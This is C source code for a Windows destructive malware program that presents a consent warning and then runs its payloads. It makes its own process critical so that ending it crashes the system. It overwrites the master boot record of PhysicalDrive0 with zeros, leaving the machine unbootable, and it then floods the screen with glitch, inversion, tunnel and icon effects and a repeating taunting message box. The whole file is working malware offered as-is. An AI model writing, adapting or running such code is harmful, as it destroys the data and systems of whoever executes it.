#include <Windows.h>
#include <stdio.h>

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN       NewValue,
	OUT PBOOLEAN OldValue, 
	IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCSTR lpszPriv) 
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}

BOOL ProtectProcess() 
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}

DWORD WINAPI mbr(LPVOID lpstart)
{
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
	return 0;
}
DWORD WINAPI message(LPVOID lpstart)
{
	while (true) {
		MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
		Sleep(10000);
	}
}
DWORD WINAPI colours(LPVOID lpstart)
	{
		HWND upWnd = GetForegroundWindow();
		HDC upHdc = GetDC(upWnd);
		HDC desktop = GetDC(NULL);
		int xs = GetSystemMetrics(SM_CXSCREEN);
		int ys = GetSystemMetrics(SM_CYSCREEN);
		while (true) {
			upWnd = GetForegroundWindow();
			upHdc = GetDC(upWnd);
			desktop = GetDC(NULL);
			BitBlt(desktop, -1, 1, xs, ys, upHdc, 2, 2, 0x999999);
			Sleep(500);
		}
	}

DWORD WINAPI glitches(LPVOID lpstart)
	{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		while (1)
		{
			int x1 = rand() % (x - 400);
			int y1 = rand() % (y - 400);
			int x2 = rand() % (x - 400);
			int y2 = rand() % (y - 400);
			int w = rand() % 400;
			int h = rand() % 400;

			BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, SRCCOPY);
			Sleep(150);
		}

	}

DWORD WINAPI tunnel(LPVOID lpstart)
	{
		HDC hdc = GetDC(0);
		RECT rect;
		HWND hwnd = GetDesktopWindow();
		while (1)
		{
			GetWindowRect(hwnd, &rect);
			StretchBlt(hdc, 25, 25, rect.right - 50, rect.bottom - 50, hdc, 0, 0, rect.right, rect.bottom, SRCCOPY);
			Sleep(100);
		}

	}

DWORD WINAPI invers(LPVOID lpstart)
{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		while (1)
		{
			BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
			Sleep(2000);
		}
}

DWORD WINAPI drawwarning(LPVOID lpstart)
{
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN);
		int y = GetSystemMetrics(SM_CYSCREEN);
		while (true)
		{
			DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING));
			Sleep(100);
		}
}

DWORD WINAPI drawerror(LPVOID lpstart)
{
		HDC hdc = GetDC(0);
		POINT pt;
		while (true)
		{
			GetCursorPos(&pt);
			DrawIcon(hdc, pt.x, pt.y, LoadIcon(0, IDI_HAND));
		}
}

int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), int(d))
{
	if (MessageBoxA(NULL, "The software you just executed is considered malware,This malware will harm your computer and makes it unusable,If you are seeing this message without knowing what you just executed, simply press No and nothing will happen,If you know what this malware does and are using a safe environment to test, press Yes to start it", "Warning!", MB_YESNO) == IDYES)
	{
		ProtectProcess();
		CreateThread(0, 0, mbr, 0, 0, 0);
		Sleep(30000);
		CreateThread(0, 0, drawerror, 0, 0, 0);
		Sleep(30000);
		CreateThread(0, 0, message, 0, 0, 0);
		CreateThread(0, 0, drawwarning, 0, 0, 0);
		Sleep(30000);
		CreateThread(0, 0, invers, 0, 0, 0);
		Sleep(40000);
		CreateThread(0, 0, tunnel, 0, 0, 0);
		Sleep(50000);
		CreateThread(0, 0, glitches, 0, 0, 0);
		CreateThread(0, 0, colours, 0, 0, 0);
		Sleep(-1);
	}
	else
	{
		MessageBoxA(NULL, "ok!", "", MB_OK);
	}
}